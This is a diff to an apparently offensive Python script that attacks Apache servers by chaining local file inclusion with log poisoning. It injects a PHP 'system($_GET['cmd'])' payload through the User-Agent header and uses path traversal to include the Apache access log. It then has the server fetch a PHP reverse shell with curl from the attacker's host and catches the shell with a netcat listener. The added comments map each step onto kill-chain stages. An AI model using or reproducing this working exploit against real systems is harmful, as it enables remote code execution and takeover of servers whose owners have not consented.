@@ -72,6 +72,9 @@ Requirements:
 Must have vulnerable apache2 version. (One notable example is the version "Apache/2.4.38 (Debian)")
 Must have a logging file in the specified location.
 Must have at least one writable PHP file (or at least write permissions.)
+
+Covers:
+Lockheed martin kill-chain (stage 2-stage 5)
 """
 
 import subprocess
@@ -99,6 +102,8 @@ ip = input("Enter your listener IP (must be in the format 'IP' yep, confusing ri
 catalystfolder = input("Enter the CATalyst folder (A folder that is needed to parse the arguments without erroring out): ")
 catalystfile = input("Enter the CATalyst php file (an existing php file you hopefully have write access on): ")
 vulnerablequerystring = input("Enter the potentially vulnerable query string (the most critical part of this exploit): ")
+
+# Stage 1: Weaponization
 php_script = """
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
@@ -287,17 +292,20 @@ function printit ($string) {
 with open(catalystfile, "w") as file:
     file.write(php_script)
 
+# Stage 2: Exploitation
 print("Attempting to poison the logfile...")
 try:
     # Poisoning the logfile by injecting PHP code via User-Agent header
     headers = {
-        "User-Agent": "<?php system($_GET['cmd']); ?>"
+        "User-Agent": "<?php system($_GET['cmd']); ?>" # Here we poison the log with a PHP command injected as the User-Agent that essentially tells the server to execute anything within the "cmd" query string.
     }
     params = {
-        vulnerablequerystring: f"./{catalystfolder}/../../../../../var/log/apache2/access.log",
-        "ext": ""
+        vulnerablequerystring: f"./{catalystfolder}/../../../../../var/log/apache2/access.log", # Here we leverage LFI (Local File Inclusion) vulnerabilities to access the access.log file, and poison it as seen above.
+        "ext": "" # This file ext is necessary for some webservers, usually has no effect though.
     }
-
+    
+    # Why is this so loud? It's a logfile, it logs!
+    
     # Sending the request to poison the logfile
     requests.get(url, params=params, headers=headers)
     print("Logfile poisoned. How subtle, it's almost as if 100 kilos of C4 exploded. Absolutely silent!")
@@ -305,6 +313,7 @@ except Exception as e:
     print(f"Failed spectacularly. Are you sure you're understanding this well-documented manual?:\n{e}")
     exit(0)
 
+# Stage 3: Delivery
 print("Launching HTTP server to serve reverse shell payload...")
 http_server_thread = threading.Thread(target=start_http_server)
 http_server_thread.start()
@@ -316,7 +325,7 @@ try:
     params = {
         vulnerablequerystring: f"./{catalystfolder}/../../../../../var/log/apache2/access.log",
         "ext": "",
-        "cmd": f"curl {payload_url} -o ./{catalystfile}"
+        "cmd": f"curl {payload_url} -o ./{catalystfile}" # Here we get the file via curl in the "cmd" query string, log poisoning is actually pretty effective.
     }
 
     requests.get(url, params=params)
@@ -329,13 +338,19 @@ print("Launching listener for reverse shell...")
 listener_thread = threading.Thread(target=start_nc_listener)
 listener_thread.start()
 
+# Stage 4: Installation
 time.sleep(3)  # Ensure nc is actively listening before the grand finale
 try:
     print("Attempting to start reverse shell...")
-    revshell_url = f"{url}/?{vulnerablequerystring}={catalystfile.rsplit('.', 1)[0]}"
-    print(revshell_url)
+    revshell_url = f"{url}/?{vulnerablequerystring}={catalystfile.rsplit('.', 1)[0]}" 
+    # This may look confusing at first, but imagine that the querystring is "test," the catalyst file is hello.php, and the url is example.com, it would look like this as a request: http://example.com/?test=hello
     start_revshell(revshell_url)
 except Exception as e:
     print(f"Well, you almost had it, but you were too busy bragging to your friends instead of double-checking your spelling:\n{e}")
 
+# Stage 5: Post-Exploitation
+# Here the user does their commands through the reverse shell.
 listener_thread.join()
+exit(0)
+
+# Note that I skipped reconnasaince, in a real-life scenario, your number 1 priority should be to gain as much information as you can about your target before engaging, this option is much more stealthy and practical if done properly.
